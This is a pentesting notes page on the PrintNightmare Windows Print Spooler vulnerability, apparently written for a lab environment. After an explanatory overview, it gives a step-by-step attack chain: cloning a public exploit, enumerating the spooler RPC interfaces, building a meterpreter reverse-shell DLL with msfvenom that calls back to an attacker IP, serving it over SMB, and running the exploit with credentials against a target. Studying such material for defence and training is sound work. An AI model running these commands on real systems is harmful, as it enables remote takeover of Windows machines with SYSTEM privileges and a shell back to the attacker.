# PrintNightmare

## Overview

PrintNightmare is a critical security vulnerability (CVE-2021-34527) discovered in the Windows Print Spooler service, which is responsible for managing print jobs on a Windows system. The vulnerability allows attackers to remotely execute code with system-level privileges, potentially leading to full system compromise.

### Overview of PrintNightmare (CVE-2021-34527)

- **Affected Component:** Windows Print Spooler service.
- **Vulnerability Type:** Remote Code Execution (RCE).
- **Impact:** Allows remote attackers to execute arbitrary code on affected systems with SYSTEM privileges, potentially taking full control of the system.
- **Discovery Date:** June 2021.
- **Affected Versions:** Various versions of Windows, including Windows 7, 8, 10, and Windows Server editions.

### How PrintNightmare Works

The vulnerability stems from improper handling of print spooler requests, allowing an attacker to inject malicious code into the spooler service. An attacker could exploit this vulnerability to gain elevated privileges and execute arbitrary code on the affected system.

1. **Remote Code Execution:** An attacker can remotely trigger the vulnerability by sending a specially crafted print job or by remotely interacting with the vulnerable Print Spooler service, typically through SMB (Server Message Block) or RPC (Remote Procedure Call).
  
2. **Privilege Escalation:** Once an attacker can execute code in the context of the Print Spooler service, they can achieve SYSTEM-level privileges, allowing them to perform actions such as installing malware, altering system configurations, and compromising sensitive data.

3. **Exploitation Vector:** Since the vulnerability is present in the Print Spooler service, an attacker doesn't need physical access to a system to exploit it, making it a high-risk vulnerability for remote exploitation.


### Exploitation Scenarios

- **Remote Attacks:** Attackers can exploit the vulnerability remotely via network protocols like SMB or RPC to compromise machines that have the Print Spooler service running.
- **Local Attacks:** If an attacker has local access to a machine, they could leverage this vulnerability to escalate privileges to SYSTEM and take control of the system.

## Attack Execution

Install PrintNightmare from cube0x0 exploit using git from a Linux-based host

    git clone https://github.com/cube0x0/CVE-2021-1675.git

    also try

    https://github.com/dievus/printspoofer

Check if a Windows target has MS-PAR & MSRPRN exposed

    rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Generate a DLL payload to be used by the exploit to gain a shell session.

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll

Create an SMB server and host a shared folder (CompData) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host.


    sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

Executes the exploit and specifies the location of the DLL payload

    sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'

